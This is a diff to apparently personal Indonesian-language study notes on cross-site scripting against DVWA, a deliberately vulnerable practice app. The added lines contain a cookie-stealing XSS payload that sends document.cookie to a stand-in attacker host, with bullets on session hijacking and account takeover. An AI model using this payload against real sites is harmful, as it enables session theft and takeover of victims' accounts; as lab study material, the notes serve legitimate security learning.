@@ -1,6 +1,6 @@
 ---
 title: XSS
-updated: 2025-12-17 01:01:05Z
+updated: 2025-12-17 04:40:06Z
 created: 2025-12-17 01:00:45Z
 latitude: -6.20239360
 longitude: 106.65270990
@@ -219,6 +219,19 @@ http://192.168.0.100/DVWA-1.9/hackable/uploads/xss.html
 ```
 
 IP 192.168.0.100 di ganti dengan IP DVWA server
+
+&nbsp;
+
+&lt;script&gt;location='[http://attacker.local/?c='+document.cookie&lt;/script&gt;](http://attacker.local/?c=%27+document.cookie&lt;/script&gt "http://attacker.local/?c='+document.cookie&lt;/script&gt");
+
+Dengan cookie session:
+
+- Penyerang bisa **session hijacking**
+    
+- Login sebagai korban
+    
+- Account Takeover
+    
 
 ## Referensi
 
